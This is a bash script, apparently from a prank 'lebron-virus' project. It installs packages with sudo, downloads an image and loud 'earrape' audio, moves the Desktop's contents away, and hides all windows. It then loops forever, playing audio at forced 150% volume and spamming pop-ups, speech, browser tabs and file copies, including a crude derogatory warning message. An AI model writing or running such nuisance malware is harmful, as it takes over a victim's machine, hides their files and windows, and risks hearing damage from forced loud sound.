#!/usr/bin/env bash

install_dep() {
    local pkg="$1"
    if command -v pacman &>/dev/null; then
        sudo pacman -S --noconfirm "$pkg"
    elif command -v apt &>/dev/null; then
        case "$pkg" in
            libnotify) pkg="libnotify-bin" ;;
	    alsa-utils) pkg="alsa-utils" ;;           
        esac
        sudo apt install -y "$pkg"
    elif command -v dnf &>/dev/null; then
        sudo dnf install -y "$pkg"
    elif command -v zypper &>/dev/null; then
        sudo zypper install -y "$pkg"
    else
        echo "Unknown package manager, install $pkg manually"
        exit 1
    fi
}


  deps=(wmctrl xdotool libnotify zenity mpg123 espeak-ng)
    for dep in "${deps[@]}"; do
     if ! command -v "$dep" &>/dev/null; then
        install_dep "$dep"
    fi
 done

     if ! command -v amixer &>/dev/null; then
    install_dep alsa-utils
 fi


curl "https://a.espncdn.com/combiner/i?img=/i/headshots/nba/players/full/1966.png" > ~/lebron.png
curl "https://raw.githubusercontent.com/Very-cool-guy/lebron-virus/main/resources/fire.mp3" > ~/fire.mp3
curl "https://raw.githubusercontent.com/Very-cool-guy/lebron-virus/main/resources/lebron.mp3" > ~/lebron.mp3
curl "https://raw.githubusercontent.com/ZhestyRin/lebron-virus/main/resources/Voicy_NFL%20Theme%20errape.mp3" > ~/earape.mp3


mkdir -p ~/Desktop_backup
mv ~/Desktop/{*,.*} ~/Desktop_backup/ 2>/dev/null

wmctrl -l | awk '{print $1}' | while read id; do
    wmctrl -i -r "$id" -b add,hidden
done

setwallpaper() {
    if [ "$XDG_CURRENT_DESKTOP" = "KDE" ]; then
        qdbus org.kde.plasmashell /PlasmaShell evaluateScript "
        var allDesktops = desktops();
        for (var i=0; i<allDesktops.length; i++) {
            allDesktops[i].wallpaperPlugin = 'org.kde.image';
            allDesktops[i].currentConfigGroup = ['Wallpaper', 'org.kde.image', 'General'];
            allDesktops[i].writeConfig('Image', 'file:///home/$USER/lebron.png');
        }"
    elif [ "$XDG_CURRENT_DESKTOP" = "GNOME" ]; then
        gsettings set org.gnome.desktop.background picture-uri "file:///home/$USER/lebron.png"
    elif [ "$XDG_CURRENT_DESKTOP" = "XFCE" ]; then
        xfconf-query -c xfce4-desktop -p /backdrop/screen0/monitor0/image-path -s ~/lebron.png
    else
        echo "Unsupported desktop environment"
    fi
}
setwallpaper

lebronCount=1

while true
do
    for i in {1..5}; do
        mpg123 ~/lebron.mp3
	mpg123 ~/earape.mp3
    done
    mpg123 ~/fire.mp3
    mpg123 ~/earape.mp3
done&

copylebron() {
        cp ~/lebron.png "$HOME/Desktop/lebron$lebronCount.png"
        ((lebronCount++))
}

linklebron() {
        xdg-open "https://a.espncdn.com/combiner/i?img=/i/headshots/nba/players/full/1966.png"
}

notiflebron() {
        notify-send "Lebron" "Lebron James Is The Goat"
}

saylebron() {
    voices=(en en-us en-gb en-au)
    randvoice=${voices[$RANDOM % ${#voices[@]}]}
    randrate=$(( (RANDOM % 450) + 50 ))
    espeak-ng -v $randvoice -s $randrate "Lebron James is the goat." &

}

openpiclebron() {
        xdg-open ~/lebron.png &
}

warnlebron() {
        zenity --warning --text="WARNING: LEBRON JAMES IS GAYYYYYYYY!!!!!" &
}


all_funcs=("copylebron" "linklebron" "notiflebron" "saylebron" "openpiclebron" "warnlebron")

while true
do
    random_index=$(( RANDOM % ${#all_funcs[@]} ))
    ${all_funcs[$random_index]}
    sleep 0.1s
    pactl set-sink-volume @default@ 150%
    pactl set-sink-mute @default@ false
    amixer set Master 150% unmute
    amixer set Speaker 150% unmute
    amixer set Headphone 150% unmute

done


